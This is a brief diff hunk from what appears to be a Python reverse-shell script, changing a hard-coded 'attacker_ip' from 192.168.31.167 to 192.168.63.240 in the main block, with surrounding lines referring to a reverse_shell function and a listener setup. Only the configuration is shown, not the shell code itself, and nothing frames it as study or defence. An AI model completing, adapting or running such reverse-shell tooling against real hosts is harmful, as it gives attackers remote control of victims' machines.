@@ -30,7 +30,7 @@ def reverse_shell(target_ip, target_port):
 # Main function to run everything
 if __name__ == "__main__":
     # Get local IP of the attacker
-    attacker_ip = "192.168.31.167"
+    attacker_ip = "192.168.63.240"
     print(f"Attacker's IP Address: {attacker_ip}")
     
     # Set port to listen on (same as the listener setup)
